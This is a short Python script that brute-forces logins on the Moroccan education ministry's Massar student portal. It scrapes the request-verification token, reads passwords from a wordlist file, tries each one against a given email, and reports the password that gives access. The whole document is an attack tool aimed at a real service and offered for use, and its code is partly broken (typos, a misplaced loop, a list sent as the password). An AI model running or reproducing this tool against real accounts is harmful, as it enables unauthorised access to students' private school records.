import requests
from bs4 import BeautifulSoup

url = "https://massarservice.men.gov.ma/moutamadris/Account"

def get_token(source):
    
    soup = BeautifulSoup(source, "html.parser")
    
    return soup.find('input', { "type" : "hidden" })['value']

with requests.Session() as s:
    
    src = s.get(url).text
    
    email = input("Eenter Your Email :")
    
    password = open(input("Eenter Your Password :")).read().split()
    
for P_assword in password :
    
    creds = {
        
        "username"   : email,
        
        "password"   : P_assword.split(),
        
        "Login"      : "Submit",
        
        "__RequestVerificationToken" : get_token(src),
        
        }
    r = s.post(url, data = creds)
        
    if "مساري الدراسي" in r.text :

        print(r.text,"Find Password :",P_assword)
        
    else :
        print(r.text,"Error Password :",P_assword)

